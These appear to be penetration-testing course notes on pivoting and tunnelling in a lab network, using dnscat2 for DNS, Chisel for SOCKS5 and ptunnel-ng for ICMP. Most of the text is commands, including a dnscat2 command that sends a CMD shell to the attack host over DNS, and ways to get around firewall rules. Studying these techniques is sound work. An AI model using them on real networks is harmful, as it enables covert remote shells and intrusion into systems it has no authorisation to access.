# DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunnelling tool, it uses DNS to send data between hosts, it uses an encrypted `C2` channel to send data inside TXT records within DNS protocol.
## Setting Up & Using dnscat2
#### Cloning dnscat2 and Setting Up the Server

```sh
git clone https://github.com/iagox86/dnscat2.git 
cd dnscat2/server/ 
sudo gem install bundler 
sudo bundle install
```

We can then start the dnscat2 server by executing the dnscat2 file.
#### Starting the dnscat2 server

```sh
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
#### Cloning dnscat2-powershell to the Attack Host

```sh
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.
#### Importing dnscat2.ps1

```powershell
Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```sh
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

---
# SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH.
## Setting Up & Using Chisel
#### Cloning Chisel

```sh
git clone https://github.com/jpillora/chisel.git
```
#### Building the Chisel Binary

```sh
cd chisel
go build
```
#### Running the Chisel Server on the Pivot Host

```sh
./chisel server -v -p 1234 --socks5
```
#### Connecting to the Chisel Server

```sh
./chisel client -v 10.129.202.64:1234 socks
```
#### Editing & Confirming proxychains.conf

```sh
# Add this line 
socks5 127.0.0.1 1080
```

Now we can use our tools with `proxychains`.

## Chisel Reverse Pivot

In our last scenario, we used the compromised machine as our <span style="color:rgb(0, 176, 80)">Chisel server</span>, listening on port 1234. Still, we might face a scenario where <span style="color:rgb(192, 0, 0)">firewall rules restrict inbound connections</span>. In such case, we can use the <span style="color:rgb(0, 176, 80)">Chisel reverse option</span>.
#### Starting the Chisel Server on our Attack Host

```sh
sudo ./chisel server --reverse -v -p 1234 --socks5
```
#### Connecting the Chisel Client to our Attack Host

```sh
./chisel client -v 10.10.14.17:1234 R:socks
```

---
# ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`.

```ad-important
 ICMP tunneling would only work when ping responses are permitted within a firewalled network.
```

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our compromised server and our attack host.

We will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host.
## Setting Up & Using ptunnel-ng

```sh
git clone https://github.com/utoni/ptunnel-ng.git
```
#### Building Ptunnel-ng with Autogen.sh

```sh
sudo ./autogen.sh
```

Now we have to send the whole repo to the target. Another approach is to build a static binary.
#### Alternative approach of building a static binary

```sh
sudo apt install automake autoconf -y 

cd ptunnel-ng/ 

sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh 

./autogen.sh
```
#### Starting the ptunnel-ng Server on the Target Host

```sh
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

The IP address following `-r` should be the IP of the jump-box we want `ptunnel-ng` to accept connections on. In this case, whatever <span style="color:rgb(0, 176, 80)">IP is reachable from our attack host</span> would be what we would use.
#### Connecting to ptunnel-ng Server from Attack Host

```sh
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
#### Tunneling an SSH connection through an ICMP Tunnel

```sh
ssh -p2222 -lubuntu 127.0.0.1
```
#### Enabling Dynamic Port Forwarding over SSH

```sh
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
#### Proxychaining through the ICMP Tunnel

```sh
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

```ad-warning
Consider the versions of GLIBC, make sure you are on par with the one on the target.
```

---
# Double Pivots

